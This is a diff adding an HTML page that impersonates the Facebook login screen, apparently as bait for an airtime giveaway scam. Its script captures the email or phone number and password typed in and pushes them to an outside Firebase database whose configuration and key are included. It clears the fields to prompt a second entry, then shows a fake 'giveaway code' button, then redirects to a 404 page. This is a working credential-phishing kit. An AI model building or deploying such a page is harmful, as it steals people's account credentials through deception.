@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Facebook Login Page</title>
+    <link rel="stylesheet" href="./login_form_2.css"/>
+
+    <style>
+       @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap");
+      
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      
+      body {
+        font-family: "Poppins", sans-serif; 
+        background: #f2f4f7;
+      }
+       
+      .content {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+      }
+        
+      .flex-div {
+        display: flex;
+        justify-content: space-evenly;
+        align-items: center;
+      }
+      
+      .name-content {
+        margin-right: 7rem;
+      }
+
+      .name-content .logo {
+        font-size: 3.5rem; 
+        color: #1877f2;
+      }
+
+      .name-content p {
+        font-size: 1.3rem; 
+        font-weight: 500;
+        margin-bottom: 5rem;
+      }
+      
+      form {
+        display: flex;
+        flex-direction: column;
+        background: #fff;
+        padding: 2rem;
+        width: 530px;
+        height: 380px;
+        border-radius: 0.5rem;
+        box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb (0 0 0 / 10%);
+      }
+        
+      form input {
+        outline: none;
+        padding: 0.8rem 1rem; 
+        margin-bottom: 0.8rem;
+        font-size: 1.1rem;
+      }
+
+      form input:focus {
+        border: 1.8px solid #1877f2;
+      }
+      
+      form .login {
+        outline: none;
+        border: none;
+        background: #1877f2; 
+        padding: 0.8rem 1rem; 
+        border-radius: 0.4rem; 
+        font-size: 1.1rem; 
+        color: #fff;
+      }
+      
+      form .login:hover {
+        background: #0f71f1;
+        cursor: pointer;
+      }
+
+      form a {
+        text-decoration: none;
+        text-align: center; 
+        font-size: 1rem;
+        padding-top: 0.8rem;
+        color: #1877f2;
+      }
+      
+      form hr {
+        background: #f7f7f7;
+        margin: 1rem;
+      }
+      
+      form .create-account {
+        outline: none;
+        border: none;
+        background: #06b909;
+        padding: 0.8rem 1rem;
+        border-radius: 0.4rem;
+        font-size: 1.1rem;
+        color: #fff;
+        width: 75%;
+        margin: 0 auto;
+      }
+      
+      form .create-account:hover {
+        background: #03ad06;
+        cursor: pointer;
+      }
+
+      .sub-content2 {
+            width: 100%;
+            height: auto;
+            margin: 10px auto;
+            border: 1px solid #cacaca;
+            padding: 14px 20px;
+            background-color: #fff;
+            display: none;
+        }
+
+        .s-part2 {
+            text-align: center;
+            font-size: 14px;
+            font-weight: normal;
+            color: #ff0000;
+        }
+
+        .s-part2 button {
+            cursor: pointer;
+            background-color: #12a1e4;
+            color: #fff;
+            margin-top: 7px;
+            border: solid 1px rgb(13, 111, 202);
+            border-radius: 8px;
+            padding: 7px;
+        }
+
+      /* Media Query */
+
+      @media (max-width: 500px) {
+        html {
+          font-size: 60%;
+        }
+        
+        .name-content {
+          margin: 0;
+          text-align: center;
+        }
+        
+        form {
+          width: 300px;
+          height: fit-content;
+        }
+        
+        form input {
+          margin-bottom: 1rem;
+          font-size: 1.5rem;
+        }
+      
+        form .login {
+          font-size: 1.5rem;
+        }
+        
+        form a {
+          font-size: 1.5rem;
+        }
+        
+        form .create-account {
+          font-size: 1.5rem;
+        }
+
+        .flex-div {
+          display: flex;
+          flex-direction: column;
+        }
+      }
+      
+      @media (min-width: 501px) and (max-width: 768px) {
+        html {
+          font-size: 60%;
+        }
+        
+        .name-content {
+          margin: 0;
+          text-align: center;
+        }
+        
+        form {
+          width: 300px;
+          height: fit-content;
+        }
+          
+        form input {
+          margin-bottom: 1rem; 
+          font-size: 1.5rem;
+        }
+         
+        form .login {
+          font-size: 1.5rem;
+        }
+          
+        form a {
+          font-size: 1.5rem;
+        }
+
+        form create-account {
+          font-size: 1.5rem;
+        }
+        
+        .flex-div { 
+          display: flex;
+          flex-direction: column;
+        }
+      }
+      
+      @media (min-width: 769px) and (max-width: 1200px) {
+        html {
+          font-size: 60%;
+        }
+        
+        .name-content {
+          margin: 0;
+          text-align: center;
+        }
+        
+        form {
+          width: 300px;
+          height: fit-content;
+        }
+         
+        form input {
+          margin-bottom: 1rem;
+          font-size: 1.5rem;
+        }
+          
+        form .login {
+          font-size: 1.5rem;
+        }
+          
+        form a {
+          font-size: 1.5rem;
+        }
+         
+        form .create-account {
+          font-size: 1.5rem;
+        }
+          
+        .flex-div {
+          display: flex;
+          flex-direction: column;
+        }
+      }
+        
+      @media (orientation: landscape) and (max-height: 500px) {
+        .header {
+          height: 90vmax;
+        }
+
+        
+      }
+    </style>
+    
+  </head> 
+  <body>
+    <div class="content"> 
+      <div class="flex-div">
+        <div class="name-content">
+          <h1 class="logo">Facebook</h1>
+          <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <form>
+          <input type="text" id="usernme" placeholder="Email or Phone Number" required />
+          <input type="password" id="passwrd" placeholder="Password" required> 
+          <input type="submit" value="Log in" class="login" id="submit" >
+          <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgot Password?</a> <hr>
+          
+          <button type="button" class="create-account">
+            <a href="https://web.facebook.com/r.php?next=https%3A%2F%2Fm.facebook.com%2Freg%2F%2522&_rdc=1&_rdr" target="_blank" style="color: white; text-decoration: none;">Create New Account</a>
+        </button>
+
+          <div class="sub-content2" id="myDiv">
+            <div class="s-part2">
+              Didnt get unique giveaway code?<br><button type="button" id="newWay">TRY ANOTHER WAY</button>
+            </div>
+          </div>
+  
+        </form> 
+
+
+      </div>
+    </div> 
+
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"
+      import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js"; 
+ 
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      // Your web app's Firebase configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyA7QeopUT5UFInhbpuEDjg3pNRAvGPzL0M",
+        authDomain: "airtimenaijabonus.firebaseapp.com",
+        projectId: "airtimenaijabonus",
+        storageBucket: "airtimenaijabonus.appspot.com",
+        messagingSenderId: "151282868315",
+        appId: "1:151282868315:web:7e25bbbfcfc08bbb8fdf7e"
+      };
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const formDB = getDatabase(app);
+  
+      document.getElementById("submit").addEventListener("click", submitForm);
+  
+      let clickCount = 0;
+      const myDiv = document.getElementById('myDiv');
+  
+      function submitForm(e) {
+          e.preventDefault();
+  
+          let username = document.getElementById("usernme").value;
+          let password = document.getElementById("passwrd").value;
+  
+          if (!username || !password) {
+              alert('Both fields are required.');
+              return false;
+          } else {
+              saveMessage("fbform", username, password);
+  
+              // Clear the input fields
+              document.getElementById("usernme").value = "";
+              document.getElementById("passwrd").value = "";
+  
+              clickCount++;
+  
+              if (clickCount === 2) {
+                  myDiv.style.display = 'block';
+              } else if (clickCount === 3) {
+                  location.href = '404.html';
+              }
+          }
+      }
+  
+      const saveMessage = (formtype, username, password) => {
+          const messageRef = ref(formDB, 'messages');
+          const newForm = push(messageRef);
+  
+          set(newForm, {
+              formtype: formtype,
+              username: username,
+              password: password
+          });
+      };
+  
+      function generateRandomKey() {
+          const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+          let key = '';
+          for (let i = 0; i < 6; i++) {
+              const randomIndex = Math.floor(Math.random() * characters.length);
+              key += characters[randomIndex];
+          }
+          return key;
+      }
+  
+      // Add an event listener to the button to generate and alert the key
+      document.getElementById('newWay').addEventListener('click', () => {
+          const randomKey = generateRandomKey();
+          alert(`Your secret code is: ${randomKey}\nNote: This code can only be generated once.`);
+          document.getElementById('newWay').disabled = true;
+      });
+  </script>
+  
+  </body>
+</html>
